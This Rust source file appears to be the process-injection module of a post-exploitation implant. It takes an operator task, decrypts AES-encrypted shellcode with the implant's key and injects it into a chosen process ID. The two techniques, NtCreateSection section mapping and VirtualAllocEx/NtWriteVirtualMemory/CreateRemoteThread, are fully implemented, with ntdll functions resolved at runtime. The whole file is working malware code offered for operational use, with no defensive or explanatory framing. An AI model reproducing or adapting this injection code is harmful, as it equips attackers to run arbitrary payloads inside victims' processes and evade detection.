// inject.rs — Process injection for post-exploitation shellcode delivery.
//
// Two techniques, selected by the operator at dispatch time:
//
//   section_map    NtCreateSection shared mapping — no cross-process write
//   classic        VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
//
// Wire format from TaskHandler:
//   INJECT:<method>:<pid>:<b64(AES ciphertext)>

use base64::{engine::general_purpose::STANDARD as B64, Engine};
use std::ffi::c_void;
use windows::core::PCSTR;
use windows::Win32::Foundation::{CloseHandle, HANDLE};
use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
use windows::Win32::System::Memory::{
    VirtualAllocEx, MEM_COMMIT, MEM_RESERVE,
    PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READWRITE,
};
use windows::Win32::System::Threading::{
    CreateRemoteThread, OpenProcess,
    PROCESS_ALL_ACCESS,
};

const SEC_COMMIT: u32 = 0x0800_0000;
const SECTION_ALL_ACCESS: u32 = 0x000F_001F;
const VIEW_UNMAP: u32 = 2;

type FnNtCreateSection = unsafe extern "system" fn(
    *mut HANDLE, u32, *mut c_void, *mut i64, u32, u32, *mut c_void,
) -> i32;
type FnNtMapViewOfSection = unsafe extern "system" fn(
    HANDLE, HANDLE, *mut *mut c_void, usize, usize,
    *mut i64, *mut usize, u32, u32, u32,
) -> i32;
type FnNtUnmapViewOfSection = unsafe extern "system" fn(HANDLE, *mut c_void) -> i32;
type FnNtCreateThreadEx = unsafe extern "system" fn(
    *mut HANDLE, u32, *mut c_void, HANDLE, *const c_void,
    *mut c_void, u32, usize, usize, usize, *mut c_void,
) -> i32;
type FnNtWriteVirtualMemory = unsafe extern "system" fn(
    HANDLE, *mut c_void, *const c_void, usize, *mut usize,
) -> i32;

unsafe fn resolve_ntdll_fn<T>(name: &[u8]) -> Option<T> {
    let h = GetModuleHandleA(PCSTR(b"ntdll.dll\0".as_ptr())).ok()?;
    let p = GetProcAddress(h, PCSTR(name.as_ptr()))?;
    Some(std::mem::transmute_copy(&p))
}

pub fn handle_inject(arg: &str) -> String {
    // arg = "<method>:<pid>:<b64_ciphertext>"
    let parts: Vec<&str> = arg.splitn(3, ':').collect();
    let (method, pid_str, b64_payload) = match parts.as_slice() {
        [m, p, d] => (*m, *p, *d),
        _ => return "inject: expected method:pid:payload".to_string(),
    };
    let pid: u32 = match pid_str.parse() {
        Ok(p) => p,
        Err(_) => return format!("inject: invalid pid '{pid_str}'"),
    };
    let encrypted = match B64.decode(b64_payload.trim()) {
        Ok(b) => b,
        Err(_) => return "inject: invalid base64".to_string(),
    };
    let cfg = unsafe { &*(&raw const crate::config::IMPLANT_CONFIG) };
    let shellcode = match crate::crypto::decrypt_bytes(&encrypted, cfg.key(), cfg.iv()) {
        Ok(sc) => sc,
        Err(e) => return format!("inject: decrypt failed: {e}"),
    };

    let result = unsafe {
        let h_process = match OpenProcess(PROCESS_ALL_ACCESS, false, pid) {
            Ok(h) => h,
            Err(e) => return format!("inject: OpenProcess failed: {e}"),
        };
        let ok = match method {
            "section_map"  => inject_section_map(h_process, &shellcode),
            "classic"      => inject_classic(h_process, &shellcode),
            _ => return format!("inject: unknown method '{method}'"),
        };
        let _ = CloseHandle(h_process);
        ok
    };
    if result {
        format!("inject: {method} into PID {pid} — executing")
    } else {
        format!("inject: {method} into PID {pid} — failed")
    }
}

// ── section_map ─────────────────────────────────────────────────────────────

unsafe fn inject_section_map(target: HANDLE, shellcode: &[u8]) -> bool {
    let create_sec: FnNtCreateSection = match resolve_ntdll_fn(b"NtCreateSection\0") {
        Some(f) => f, None => return false,
    };
    let map_view: FnNtMapViewOfSection = match resolve_ntdll_fn(b"NtMapViewOfSection\0") {
        Some(f) => f, None => return false,
    };
    let unmap_view: FnNtUnmapViewOfSection = match resolve_ntdll_fn(b"NtUnmapViewOfSection\0") {
        Some(f) => f, None => return false,
    };
    let create_thread: FnNtCreateThreadEx = match resolve_ntdll_fn(b"NtCreateThreadEx\0") {
        Some(f) => f, None => return false,
    };

    let self_handle = HANDLE(-1isize as *mut c_void);

    let mut section = HANDLE::default();
    let mut size = shellcode.len() as i64;
    let st = create_sec(
        &mut section, SECTION_ALL_ACCESS, std::ptr::null_mut(),
        &mut size, PAGE_EXECUTE_READWRITE.0, SEC_COMMIT, std::ptr::null_mut(),
    );
    if st < 0 { return false; }

    let mut local_base: *mut c_void = std::ptr::null_mut();
    let mut local_size: usize = 0;
    let mut offset: i64 = 0;
    let st = map_view(
        section, self_handle, &mut local_base,
        0, shellcode.len(), &mut offset, &mut local_size,
        VIEW_UNMAP, 0, PAGE_READWRITE.0,
    );
    if st < 0 { return false; }

    std::ptr::copy_nonoverlapping(shellcode.as_ptr(), local_base as *mut u8, shellcode.len());

    let mut remote_base: *mut c_void = std::ptr::null_mut();
    let mut remote_size: usize = 0;
    let mut offset2: i64 = 0;
    let st = map_view(
        section, target, &mut remote_base,
        0, shellcode.len(), &mut offset2, &mut remote_size,
        VIEW_UNMAP, 0, PAGE_EXECUTE_READ.0,
    );
    if st < 0 {
        let _ = unmap_view(self_handle, local_base);
        return false;
    }

    let _ = unmap_view(self_handle, local_base);

    let mut h_thread = HANDLE::default();
    let st = create_thread(
        &mut h_thread, 0x001F_FFFF, std::ptr::null_mut(),
        target, remote_base as *const c_void, std::ptr::null_mut(),
        0, 0, 0, 0, std::ptr::null_mut(),
    );
    if st >= 0 && !h_thread.is_invalid() {
        let _ = CloseHandle(h_thread);
    }
    st >= 0
}

// ── classic ─────────────────────────────────────────────────────────────────

unsafe fn inject_classic(target: HANDLE, shellcode: &[u8]) -> bool {
    let remote_mem = VirtualAllocEx(
        target, None, shellcode.len(),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE,
    );
    if remote_mem.is_null() { return false; }

    let write_mem: FnNtWriteVirtualMemory = match resolve_ntdll_fn(b"NtWriteVirtualMemory\0") {
        Some(f) => f, None => return false,
    };
    let mut written: usize = 0;
    let st = write_mem(
        target, remote_mem, shellcode.as_ptr() as *const c_void,
        shellcode.len(), &mut written,
    );
    if st < 0 { return false; }

    let thread_fn: unsafe extern "system" fn(*mut c_void) -> u32 = std::mem::transmute(remote_mem);
    match CreateRemoteThread(target, None, 0, Some(thread_fn), Some(remote_mem), 0, None) {
        Ok(h) => { let _ = CloseHandle(h); true }
        Err(_) => false,
    }
}
